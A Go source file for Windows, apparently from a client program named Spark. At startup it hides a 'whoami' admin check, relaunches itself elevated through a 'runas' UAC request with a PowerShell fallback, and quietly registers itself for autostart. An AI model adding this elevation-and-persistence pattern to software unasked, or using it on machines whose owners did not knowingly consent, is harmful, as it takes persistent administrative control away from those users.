//go:build windows

package main

import (
    "Spark/client/service/autostart"
    "os"
    "os/exec"
    "syscall"
    "unsafe"
)

func init() {
    // Ensure elevated privileges for features that need admin rights.
    // Relauch with UAC prompt once using the "--elevated" marker.
    if !hasElevated() && !hasArg("--elevated") {
        relaunchElevated()
        os.Exit(0)
        return
    }

    // Best-effort enable autostart in background. Ignore errors.
    _ = autostart.Enable()
}

func hasArg(flag string) bool {
    for _, a := range os.Args[1:] {
        if a == flag {
            return true
        }
    }
    return false
}

func hasElevated() bool {
    // Rudimentary check via TokenMembership of Administrators group.
    // Fallback: try to open SCM manager with required access.
    // Simpler approach: call "net session" which requires admin
    // and check for access denied; but avoid console flash.
    cmd := exec.Command("cmd", "/C", "whoami /groups | findstr /i S-1-5-32-544 >NUL")
    cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
    return cmd.Run() == nil
}

func relaunchElevated() {
    // Use ShellExecuteW with verb "runas" to trigger UAC.
    shell32 := syscall.NewLazyDLL("shell32.dll")
    proc := shell32.NewProc("ShellExecuteW")

    exe, _ := os.Executable()
    exePtr, _ := syscall.UTF16PtrFromString(exe)
    verb, _ := syscall.UTF16PtrFromString("runas")

    // Pass through args and append --elevated
    args := "--elevated"
    for _, a := range os.Args[1:] {
        args += " " + a
    }
    argsPtr, _ := syscall.UTF16PtrFromString(args)

    // SW_HIDE (0) to avoid extra window; process is GUI (built with -H=windowsgui).
    r, _, _ := proc.Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(exePtr)), uintptr(unsafe.Pointer(argsPtr)), 0, 0)
    if r <= 32 {
        // Fallback to PowerShell if ShellExecute failed.
        _ = exec.Command("powershell", "-Command", "Start-Process", exe, "-ArgumentList", args, "-Verb", "RunAs").Start()
    }
}

